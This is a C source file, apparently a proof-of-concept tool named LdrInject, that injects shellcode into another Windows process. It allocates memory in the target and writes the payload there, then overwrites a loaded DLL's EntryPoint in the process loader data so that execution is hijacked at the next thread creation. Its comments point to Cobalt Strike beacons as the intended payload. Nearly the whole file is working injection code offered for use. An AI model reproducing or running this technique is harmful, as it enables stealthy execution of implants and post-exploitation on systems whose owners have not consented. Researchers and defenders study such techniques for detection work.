#include<windows.h>
#include <stdio.h>
#include "LdrInject.h"


// PoC to inject a shellcode into a remote process using LdrShuffle technique
// Usage: LdrInject.exe <PID> <beacon_file>
//
// The shellcode should restore some values within the target process before going ahead,
// because this injection techniques tampers with a DLL EntryPoint to hijack execution temporarily.
// Refer to the LdrShuffle project for details.
// 
// A default Cobalt Strike payload won't restore these edited value, and although it will run,
// the process will crash because of the changes made during injection.
// I am providing am example Cobalt Strike beacon in the LdrInjectUDRL project if you want
// a Cobalt Strike beacon. Refer to that project for instructions to generate it.


BOOL ReadPEB(DWORD, PPEBINJ_DATA);

// Testing functions
BOOL InjectShellcodeToRemoteProcess(IN HANDLE, IN PBYTE, IN SIZE_T, OUT PVOID*);
BOOL ReadFileFromDisk(IN LPCSTR, OUT PBYTE*, OUT PDWORD);

int main(int argc, char** argv) {
	if (argc != 3) {
		printf("Usage: LdrInject.exe <PID> <shellcode>\n");
		return -1;
	}
	DWORD dwPid = atoi(argv[1]);
	LPCSTR beaconShellcode(argv[2]);

	PVOID pRemoteShellcode = NULL;
	DWORD dwThreadId = 0;
	HANDLE hThread = NULL;
	PPEBINJ_DATA pPebInjData;
	ULONG_PTR uRemoteDll;
	HANDLE hTarget = NULL;
	SIZE_T szBytesWritten = 0;;

	// Read raw beacon
	DWORD dwBeaconSize = 0;
	PBYTE pBuffer = NULL;
	if (!ReadFileFromDisk(beaconShellcode, &pBuffer, &dwBeaconSize)) {
		printf("[!] Failed to read raw shellcode file %s \n", beaconShellcode);
		goto _END;

	}
	printf("[*] Raw shellcode loaded from file, size: %d\n", dwBeaconSize);

	// identify remote DLL to tamper with
	pPebInjData = (PPEBINJ_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEBINJ_DATA));
	uRemoteDll = NULL;

	if (!ReadPEB(dwPid, pPebInjData)) {
		printf("[!] Couldn't find suitable remote DLL to tamper with. Aborting.\n");
		return -1;
	}

	// overwrite EntryPoint
	hTarget = NULL;
	szBytesWritten = 0;
	if (0 == (hTarget = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPid))) {
		printf("[!] ErrorOpening proc to write %d\n", GetLastError()); 
		goto _END;
	}


	if (!InjectShellcodeToRemoteProcess(hTarget, pBuffer, dwBeaconSize, &pRemoteShellcode)) {
		printf("[!] Failed to inject into target\n");
		goto _END;
	}
	printf("[*] Injection done at 0x%p\n", pRemoteShellcode);

	// Using LdrInject technique
	printf("[*] Backing up DLL EntryPoint (0x%p) and editing it to 0x%p\n", pPebInjData->ulEntryPointValue,pRemoteShellcode);
	// backup EntryPoint into OriginalBase
	if (0 == WriteProcessMemory(hTarget, (PVOID)pPebInjData->ulOriginalBaseAddr, (PVOID)&pPebInjData->ulEntryPointValue, sizeof(PVOID), &szBytesWritten)) {
		printf("[!] Failed to Write1 into remote process - %d - %d bytes\n", GetLastError(), szBytesWritten);
		goto _END;
	}

	// overwrite EntryPoint with shellcode address
	if (0 == WriteProcessMemory(hTarget, (PVOID)pPebInjData->ulEntryPointAddr, (PVOID)&pRemoteShellcode, sizeof(PVOID), &szBytesWritten)) {
		printf("[!] Failed to Write2 into remote process - %d - %d bytes\n", GetLastError(), szBytesWritten);
		goto _END;
	}
	printf("[*] Done, now wait for thread creation.\n");

_END:
	if (hTarget)
		CloseHandle(hTarget);

	return 0;
}

/* Find a DLL in remote process PID
* that DLL must have the DontLoadOnThread flag to NO and not be
* ntdll, kernel32 or kernelbase as a precaution
*/
BOOL ReadPEB(DWORD dwPid, PPEBINJ_DATA pPebInjData) {
	//PEB
#ifdef _WIN64
	PPEB pPeb = (PPEB)(__readgsqword(0x60));
#elif _WIN32
	PPEB pPeb = (PPEB)(__readgsqword(0x30));
#endif
	PEB_LDR_DATA* pPebLdr = (PEB_LDR_DATA*)pPeb->pLdr;
	printf("[*] Our PEB at 0x%p\n", pPebLdr);

	// Read remote PEB_LDR_DATA
	HANDLE hTarget = NULL;
	PEB_LDR_DATA remotePebLdrData = { 0 };
	SIZE_T szBytesWritten;
	LDR_DATA_TABLE_ENTRY2 remoteLdrDataEntry = { 0 };	// warning: in the address space of remote process !
	ULONG_PTR pRemoteLdrDataEntry = NULL;				// warning: in the address space of remote process !
	ULONG_PTR retDll = NULL;
	int i = 0;
	if (0 == (hTarget = OpenProcess(PROCESS_VM_READ, FALSE, dwPid))) {
		printf("[!] ErrorOpening proc %d\n", GetLastError());
		goto _END;
	}

	if (0 == ReadProcessMemory(hTarget, pPebLdr, &remotePebLdrData, sizeof(PEB_LDR_DATA), &szBytesWritten)) {
		printf("[!] Error Reading proc %d\n", GetLastError());
		goto _END;
	}
	printf("[*] Successfully reading into target process. Reviewing DLLs until we find a suitable candidate...\n");
	pRemoteLdrDataEntry = (ULONG_PTR)remotePebLdrData.InMemoryOrderModuleList.Flink - 0x10;
	while (pRemoteLdrDataEntry) {
		printf("\t[*] == DLL no%d ==\n", i);
		printf("\t[*] pRemoteLdrDataEntry: 0x%p\n", pRemoteLdrDataEntry);

		if (0 == ReadProcessMemory(hTarget, (PVOID)pRemoteLdrDataEntry, &remoteLdrDataEntry, sizeof(LDR_DATA_TABLE_ENTRY2), &szBytesWritten)) {
			printf("\t[!] Error Reading into remoteLdrDataEntry proc %d\n", GetLastError());
			goto _END;
		}
		if (remoteLdrDataEntry.BaseDllName.Length == NULL)
			break;

		printf("\t[*] Read LdrDataEntry:\n");
		printf("\t\t EntryPoint:\t0x%p\n", remoteLdrDataEntry.EntryPoint);
		printf("\t\t DllBase:\t0x%p\n", remoteLdrDataEntry.DllBase);
		printf("\t\t DontCallForThreads: %d\n", remoteLdrDataEntry.DontCallForThreads);

		if (remoteLdrDataEntry.EntryPoint != NULL && remoteLdrDataEntry.DontCallForThreads == 0 && i > 5) { // i>3 means we skip the first few DLLs for safety...
			pPebInjData->ulPebLdrDataTableEntry = pRemoteLdrDataEntry;
			pPebInjData->ulDllbaseValue = (ULONG_PTR)remoteLdrDataEntry.DllBase;
			pPebInjData->ulEntryPointAddr = pRemoteLdrDataEntry + ENTRYPOINT_OFFSET;
			pPebInjData->ulEntryPointValue = (ULONG_PTR)remoteLdrDataEntry.EntryPoint;
			pPebInjData->ulOriginalBaseAddr = pRemoteLdrDataEntry + ORIGINALBASE_OFFSET;
			pPebInjData->ulBakOriginalBaseValue = (ULONG_PTR)remoteLdrDataEntry.OriginalBase;
			break;
		}
		pRemoteLdrDataEntry = (ULONG_PTR)(remoteLdrDataEntry.InLoadOrderLinks.Flink);
		i++;
	}

	printf("\n");
	printf("[*] Done ! Located DLL no%d loaded at 0x%p\n", i, pPebInjData->ulDllbaseValue);

_END:
	if (hTarget)
		CloseHandle(hTarget);
	return (pPebInjData->ulPebLdrDataTableEntry && pPebInjData->ulDllbaseValue) ? TRUE : FALSE;
}

BOOL ReadFileFromDisk(IN LPCSTR cFileName, OUT PBYTE* ppBuffer, OUT PDWORD pdwFileSize) {

	HANDLE hFile = NULL;
	PBYTE hHeap = NULL;
	DWORD dFileSize = 0;
	DWORD dBytesRead = 0;

	if (INVALID_HANDLE_VALUE == (hFile = CreateFileA(cFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL))) {
		printf("Failed to open file\n");
		goto _CLEANUP;
	}

	if (INVALID_FILE_SIZE == (dFileSize = GetFileSize(hFile, NULL))) {
		printf("Failed to get filesize\n");
		goto _CLEANUP;
	}


	if (NULL == (hHeap = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dFileSize))) {
		printf("Failed to get heap pointer\n");
		goto _CLEANUP;
	}

	if (!ReadFile(hFile, hHeap, dFileSize, &dBytesRead, NULL) || dBytesRead != dFileSize) {
		printf("Failed to readfile\n");
		goto _CLEANUP;
	}

	*pdwFileSize = dFileSize;
	*ppBuffer = hHeap;

_CLEANUP:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	return ((*ppBuffer != NULL) && (*pdwFileSize != 0x00)) ? TRUE : FALSE;
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {


	SIZE_T  sNumberOfBytesWritten = NULL;
	DWORD   dwOldProtection = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);


	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}